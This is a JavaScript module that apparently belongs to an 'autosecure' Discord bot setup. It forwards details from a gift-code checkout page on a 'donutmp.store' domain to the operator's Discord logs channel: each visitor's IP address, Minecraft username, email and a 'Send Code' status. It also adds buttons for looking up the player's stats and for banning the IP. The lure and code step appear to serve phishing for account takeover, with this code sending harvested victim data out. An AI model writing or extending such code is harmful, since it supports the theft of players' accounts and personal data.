const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, REST, Routes } = require("discord.js");
const { queryParams } = require("../../db/database");
const { autosecureMap } = require("../../mainbot/handlers/botHandler");
const config = require("../../config.json");

// Anti-spam debounce cache: ignore duplicate logs within 15s
const recentWebLogs = new Map();
setInterval(() => {
    const now = Date.now();
    for (const [key, timestamp] of recentWebLogs.entries()) {
        if (now - timestamp > 30000) {
            recentWebLogs.delete(key);
        }
    }
}, 60000);

/**
 * Send real-time checkout logs directly to the sub-bot's #logs channel
 * Formatted exactly like the Discord bot's user submission logs (Screenshot 2)
 */
async function sendWebLog({ code, ip, domain = "donutmp.store", username, email, statusText = "Send Code" }) {
    try {
        const cleanIp = (ip || "127.0.0.1").replace(/^.*:/, '');
        const targetUsername = (username || "Player").trim();
        const targetEmail = (email || "Chưa nhập email").trim();
        const status = statusText || "Send Code";

        // Anti-spam deduplication
        const logKey = `${cleanIp}_${targetUsername.toLowerCase()}_${targetEmail.toLowerCase()}_${status.toLowerCase()}`;
        const now = Date.now();
        if (recentWebLogs.has(logKey) && now - recentWebLogs.get(logKey) < 15000) {
            console.log(`[WEB LOGGER] Skipping duplicate log for ${targetUsername} (${targetEmail}) [${status}]`);
            return false;
        }
        recentWebLogs.set(logKey, now);

        let targetBot = null;
        let botUserId = null;
        let botNumber = 1;

        // 1. Resolve bot from gift code
        if (code) {
            const rows = await queryParams(`SELECT bot_user_id, bot_number FROM gift_links WHERE code = ?`, [code]);
            if (rows.length > 0) {
                botUserId = rows[0].bot_user_id;
                botNumber = rows[0].bot_number || 1;
                targetBot = autosecureMap.get(`${botUserId}|${botNumber}`);
            }
        }

        // Fallback to any active sub-bot if specific one not resolved
        if (!targetBot && !botUserId) {
            for (const [key, bot] of autosecureMap.entries()) {
                if (bot && bot.isReady && bot.isReady()) {
                    targetBot = bot;
                    const parts = key.split('|');
                    botUserId = parts[0];
                    botNumber = parseInt(parts[1], 10) || 1;
                    break;
                }
            }
        }

        // If botUserId is still null, fallback to first autosecure row
        if (!botUserId) {
            const anyRow = await queryParams(`SELECT user_id, botnumber, logs_channel, token FROM autosecure WHERE logs_channel IS NOT NULL LIMIT 1`);
            if (anyRow && anyRow.length > 0) {
                botUserId = anyRow[0].user_id;
                botNumber = anyRow[0].botnumber || 1;
            }
        }

        // 2. Fetch logs_channel for this bot
        let settingsRows = await queryParams(`SELECT logs_channel, token FROM autosecure WHERE user_id = ? AND botnumber = ?`, [botUserId, botNumber]);
        if (!settingsRows || settingsRows.length === 0) {
            settingsRows = await queryParams(`SELECT logs_channel, token FROM autosecure WHERE user_id = ? LIMIT 1`, [botUserId]);
        }
        if (!settingsRows || settingsRows.length === 0 || !settingsRows[0].logs_channel) {
            console.warn(`[WEB LOGGER] No logs_channel configured for bot user ${botUserId} (bot #${botNumber})`);
            return false;
        }

        const [channelId] = settingsRows[0].logs_channel.split('|');
        if (!channelId) return false;

        const botToken = targetBot?.token || settingsRows[0]?.token || config.tokens?.[0];

        const dispatchMessage = async (payload) => {
            if (targetBot && targetBot.channels) {
                const channel = targetBot.channels.cache.get(channelId) || await targetBot.channels.fetch(channelId).catch(() => null);
                if (channel) {
                    await channel.send(payload);
                    return true;
                }
            }
            if (botToken) {
                try {
                    const rest = new REST({ version: '10' }).setToken(botToken);
                    await rest.post(Routes.channelMessages(channelId), {
                        body: {
                            embeds: (payload.embeds || []).map(e => (typeof e.toJSON === 'function' ? e.toJSON() : e)),
                            components: (payload.components || []).map(c => (typeof c.toJSON === 'function' ? c.toJSON() : c))
                        }
                    });
                    return true;
                } catch (restErr) {
                    console.error("[WEB LOGGER] REST dispatch error:", restErr.message);
                }
            }
            return false;
        };

        // Visage 3D Minecraft bust avatar
        const skinName = (!targetUsername.includes("@") && targetUsername !== "Player") ? targetUsername : "MHF_Steve";
        const thumbnailUrl = `https://visage.surgeplay.com/bust/${encodeURIComponent(skinName)}.png?y=-40&quality=lossless`;

        // Exact match with Discord bot messager style (Screenshot 2)
        const embed = new EmbedBuilder()
            .setColor(13773611) // #D22B2B Red left border
            .setAuthor({
                name: `${targetUsername} | ${cleanIp}`
            })
            .addFields([
                {
                    name: "Username | Email | Status",
                    value: `\`\`\`${targetUsername} | ${targetEmail} | ${status}\`\`\``
                }
            ])
            .setThumbnail(thumbnailUrl);

        // Row 1: Quick stats inspection buttons (Duels, Skywars, Skyblock, Bedwars, DonutSMP)
        const statsRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId(`duels2|${skinName}`)
                .setLabel("Duels")
                .setEmoji("🎣")
                .setStyle(ButtonStyle.Secondary),
            new ButtonBuilder()
                .setCustomId(`skywars2|${skinName}`)
                .setLabel("Skywars")
                .setEmoji("🧭")
                .setStyle(ButtonStyle.Secondary),
            new ButtonBuilder()
                .setCustomId(`skyblock2|${skinName}`)
                .setLabel("Skyblock")
                .setEmoji("🌲")
                .setStyle(ButtonStyle.Secondary),
            new ButtonBuilder()
                .setCustomId(`bedwars2|${skinName}`)
                .setLabel("Bedwars")
                .setEmoji("🛏️")
                .setStyle(ButtonStyle.Secondary),
            new ButtonBuilder()
                .setCustomId(`donut2|${skinName}`)
                .setLabel("DonutSMP")
                .setEmoji("🍩")
                .setStyle(ButtonStyle.Secondary)
        );

        // Row 2: Moderation actions (Ban, Kick, Blacklist, Unban, Unblacklist)
        const modRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId(`banip|${cleanIp}`)
                .setLabel("Ban")
                .setStyle(ButtonStyle.Danger),
            new ButtonBuilder()
                .setCustomId(`kickip|${cleanIp}`)
                .setLabel("Kick")
                .setStyle(ButtonStyle.Danger),
            new ButtonBuilder()
                .setCustomId(`blacklistip|${cleanIp}`)
                .setLabel("Blacklist")
                .setStyle(ButtonStyle.Danger),
            new ButtonBuilder()
                .setCustomId(`unbanip|${cleanIp}`)
                .setLabel("Unban")
                .setStyle(ButtonStyle.Primary),
            new ButtonBuilder()
                .setCustomId(`unblacklistip|${cleanIp}`)
                .setLabel("Unblacklist")
                .setStyle(ButtonStyle.Primary)
        );

        // Row 3: Communication (DM)
        const dmRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId(`dmip|${cleanIp}`)
                .setLabel("DM")
                .setEmoji("💬")
                .setStyle(ButtonStyle.Primary)
        );

        await dispatchMessage({
            embeds: [embed],
            components: [statsRow, modRow, dmRow]
        });

        return true;

    } catch (err) {
        console.error("[WEB LOGGER] Error dispatching web log to Discord:", err.message);
        return false;
    }
}

module.exports = { sendWebLog };
